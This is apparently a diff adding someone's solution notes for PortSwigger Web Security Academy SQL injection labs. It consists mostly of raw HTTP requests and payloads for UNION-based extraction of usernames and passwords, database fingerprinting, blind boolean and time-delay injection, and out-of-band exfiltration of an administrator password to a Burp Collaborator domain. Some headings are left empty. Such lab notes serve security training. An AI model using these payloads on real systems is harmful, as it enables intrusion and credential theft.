@@ -1,0 +1,165 @@
+1. SQL injection UNION attack, determining the number of columns returned by the query
+
+GET /filter?category=Clothing%2c+shoes+and+accessories'+UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1
+Host: ac351feb1ee3c596802830b700cc00e6.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: https://ac351feb1ee3c596802830b700cc00e6.web-security-academy.net/
+Cookie: session=4pyUuVd77VdKkQjGDqmFThKfuvJuOuj6
+Upgrade-Insecure-Requests: 1
+
+
+
+2. SQL injection UNION attack, finding a column containing text
+
+GET /filter?category=Clothing%2c+shoes+and+accessories'+UNION+SELECT+NULL,'wqp9QT',NULL-- HTTP/1.1
+Host: ac171f7e1e4cdb14805fb12f00e400c3.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: https://ac171f7e1e4cdb14805fb12f00e400c3.web-security-academy.net/
+Cookie: session=DBI5S6WXOemoD7mHopV6ZqfIfqZH3ctW
+Upgrade-Insecure-Requests: 1
+
+
+
+3. SQL injection UNION attack, retrieving data from other tables
+
+GET /filter?category=Accessories'+UNION+SELECT+username,+password+FROM+users-- HTTP/1.1
+Host: ac071fa71ee1969780081040009d00a4.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: https://ac071fa71ee1969780081040009d00a4.web-security-academy.net/
+Cookie: session=vIMrZQN1r61nSDCmdIkZChBnIgMcMYSi
+Upgrade-Insecure-Requests: 1
+
+
+4. SQL injection UNION attack, retrieving multiple values in a single column
+
+GET /filter?category=Corporate+gifts'+UNION+SELECT+NULL,username||'~'||password+FROM+users-- HTTP/1.1
+Host: ac8b1f971ee496fe8000155f0061007c.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: https://ac8b1f971ee496fe8000155f0061007c.web-security-academy.net/filter?category=Corporate+gifts
+Cookie: session=gMUPrqgyD3xKi4xkBN6gHmbaaboB2leA
+Upgrade-Insecure-Requests: 1
+
+
+5. SQL injection attack, querying the database type and version on Oracle
+
+GET /filter?category=Corporate+gifts'+UNION+SELECT+BANNER,+NULL+FROM+v$version-- HTTP/1.1
+Host: acb61f141ed839fa80a1206e00be00d7.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: https://acb61f141ed839fa80a1206e00be00d7.web-security-academy.net/filter?category=Corporate+gifts
+Cookie: session=v5pLLTRzuwJY0RvJfAFNGy3BUcUDV5ki
+Upgrade-Insecure-Requests: 1
+
+
+6. SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+GET /filter?category=Gifts'+UNION+SELECT+@@version,+NULL# HTTP/1.1
+Host: ac871fa31fba5fd481b7594d00bf0075.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: https://ac871fa31fba5fd481b7594d00bf0075.web-security-academy.net/
+Cookie: session=jAHk88xRPHqOQ3YxEmNKFfCSF51zlURi
+Upgrade-Insecure-Requests: 1
+
+
+7. SQL injection attack, listing the database contents on non-Oracle databases
+
+	'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+	'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='USERS_ABCDEF'--
+	'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
+
+
+GET /filter?category=Gifts'+UNION+SELECT+username_vmkxoz,password_wjdcbt+FROM+users_crtzqd-- HTTP/1.1
+Host: ac8d1f101eb751d480402877001200c8.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: https://ac8d1f101eb751d480402877001200c8.web-security-academy.net/
+Cookie: session=OtW5iqbRtmMemygnmeE0I1vW2mYqhaxb
+Upgrade-Insecure-Requests: 1
+
+
+
+8. SQL injection attack, listing the database contents on Oracle
+
+	'+UNION+SELECT+'abc','def'+FROM+DUAL--
+	'+UNION+SELECT+table_name,NULL+FROM+all_tables--
+	'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
+	'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
+
+GET /filter?category=Gifts'+UNION+SELECT+USERNAME_CJNAHJ,PASSWORD_SJCVRV+FROM+USERS_KXNXHN-- HTTP/1.1
+Host: ac6b1ff31f8ff58880b461690016001e.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: https://ac6b1ff31f8ff58880b461690016001e.web-security-academy.net/
+Cookie: session=TCdzhRJvaWXw21MARichSgMIJzg3Ot6C
+Upgrade-Insecure-Requests: 1
+
+9. Blind SQL injection with conditional responses
+
+	TrackingId=x'+OR+1=1--
+	x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'--
+	x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)>1--
+	x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)>5--
+	x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,1,1)='a'--
+	x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,1,1)='a'--
+	x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,2,1)='§a§'--
+
+10. Blind SQL injection with conditional errors
+
+11. Blind SQL injection with time delays
+
+	TrackingId=x'||pg_sleep(10)--
+
+12. Blind SQL injection with time delays and information retrieval
+
+13. Blind SQL injection with out-of-band interaction
+
+'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//a1cm0d2dbtu82zy4wkr5rulwnntdh2.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+14. Blind SQL injection with out-of-band data exfiltration
+
+	6sq8cjrm2olmauvh3rfj.zwzs91is4b9ikha71qvbax3whnndb2.burpcollaborator.net
+	here 6sq8cjrm2olmauvh3rfj is the password of administrator from burpcollaborator
+	administrator:6sq8cjrm2olmauvh3rfj
+
+	x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.zwzs91is4b9ikha71qvbax3whnndb2.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+'+UNION+SELECT+extractvalue(xmltype('<?xml+version%3d"1.0"+encoding="UTF-8"?><!DOCTYPE+root+[+<!ENTITY+%+remote+SYSTEM+"http://'||(SELECT+password+FROM+users+WHERE+username='administrator')||'.zwzs91is4b9ikha71qvbax3whnndb2.burpcollaborator.net/">+%remote%3b]>'),'/l')+FROM+dual--
+	
+
+15. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+
+	'+OR+1=1--
+https://ac991f101f49d0b480e94a3b005a006c.web-security-academy.net/filter?category=Gifts'+OR+1=1--
+
+
+16. SQL injection vulnerability allowing login bypass
+
